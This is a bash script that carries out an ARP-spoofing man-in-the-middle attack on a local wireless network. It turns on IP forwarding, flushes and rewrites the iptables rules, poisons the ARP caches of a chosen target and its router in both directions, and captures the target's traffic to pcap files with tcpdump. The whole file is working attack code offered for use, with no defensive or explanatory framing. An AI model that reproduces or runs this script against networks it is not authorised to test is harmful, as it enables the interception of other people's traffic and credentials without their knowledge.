#!/bin/bash

# usage: ./arp_poison.sh <target_ip> [<router_ip>]

cmd_exists() {
    command -v "$1" >/dev/null 2>&1
}

for cmd in iptables arpspoof tcpdump tail iptables-save iptables-restore; do
    if ! cmd_exists "$cmd"; then
        echo "error: $cmd is not installed."
        exit 1
    fi
done

if [ "$#" -lt 1 ] || [ "$#" -gt 2 ]; then
    echo "usage: $0 <target_ip> [<router_ip>]"
    exit 1
fi

targetip=$1

if [ -z "$2" ]; then
    routerip=$(ip route | grep default | awk '{print $3}')
    if [ -z "$routerip" ]; then
        echo "error: could not detect the router ip. please specify it manually."
        exit 1
    fi
else
    routerip=$2
fi

timestamp=$(date +%s)

sudo iptables-save > /tmp/iptables_backup.rules

ip_forward=$(sysctl net.ipv4.ip_forward | awk '{print $3}')
if [ "$ip_forward" -eq 0 ]; then
    sudo sysctl -w net.ipv4.ip_forward=1
    ip_forward_changed=1
else
    ip_forward_changed=0
fi

sudo iptables -F
sudo iptables -t nat -F
sudo iptables -X

sudo iptables -A FORWARD -i wlan0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo iptables -A FORWARD -i wlan0 -o wlan0 -j ACCEPT
sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE

echo "starting arp spoofs..."

sudo arpspoof -i wlan0 -t $targetip $routerip > arpspoof_router_$timestamp.log 2>&1 &
pid1=$!
echo "router: spoofing target ($targetip) to router ($routerip) [pid: $pid1]"

sudo arpspoof -i wlan0 -t $routerip $targetip > arpspoof_target_$timestamp.log 2>&1 &
pid2=$!
echo "target: spoofing router ($routerip) to target ($targetip) [pid: $pid2]"

sudo tcpdump -Z root -i wlan0 host $targetip -C 4 -W 8 -w ${targetip}_$timestamp.pcap &
pid3=$!
echo "tcpdump: capturing packets for $targetip [pid: $pid3]"

cleanup() {
    echo "cleaning up..."
    sudo iptables-restore < /tmp/iptables_backup.rules
    if [ "$ip_forward_changed" -eq 1 ]; then
        sudo sysctl -w net.ipv4.ip_forward=0
    fi
    sudo kill $pid1 $pid2 $pid3
    exit 0
}

trap cleanup INT TERM

tail -f arpspoof_router_$timestamp.log arpspoof_target_$timestamp.log | awk '{print strftime("%Y-%m-%d %H:%M:%S"), $0}'

echo "arp spoofing in progress. press ctrl+c to stop."
while true; do
    sleep 1
done
